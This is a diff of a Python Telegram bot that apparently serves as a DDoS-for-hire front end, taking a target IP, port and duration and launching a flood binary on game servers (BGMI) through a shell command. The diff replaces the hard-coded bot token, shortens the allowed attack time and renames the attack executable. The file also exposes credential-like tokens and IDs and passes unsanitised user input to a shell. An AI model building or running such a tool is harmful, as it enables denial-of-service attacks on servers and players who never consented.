@@ -6,7 +6,7 @@ from datetime import datetime, timedelta
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 
 # Bot token and admin ID
-bot_token = '7706816535:AAFjqNpIf-LjKRpuA7JfLTq0FGOrNq4J4Xc'
+bot_token = '7804021606:AAGL8PGHWGroReC0oqYz6wlZ2FebvZOBquw'
 admin_id = '6769245930'  # Replace with your actual admin user ID
 GROUP_ID = '-1002220511003'  # Allowed group ID
 
@@ -139,14 +139,14 @@ def handle_bgmi(message):
 
     target, port, attack_time = command[1], command[2], command[3]
 
-    if int(attack_time) > 240:
-        bot.reply_to(message, "𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗘𝗥𝗥𝗢𝗥 - 𝗧𝗥𝗬 𝟮𝟰𝟬")
+    if int(attack_time) > 180:
+        bot.reply_to(message, "𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗘𝗥𝗥𝗢𝗥 - 𝗧𝗥𝗬 180")
         return
 
     user_last_attack_time[user_id] = current_time
     user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
 
-    full_command = f"./attack {target} {port} {attack_time} 877"
+    full_command = f"./S44 {target} {port} {attack_time} 877"
     process = subprocess.Popen(full_command, shell=True)
     running_attacks[user_id] = process
 
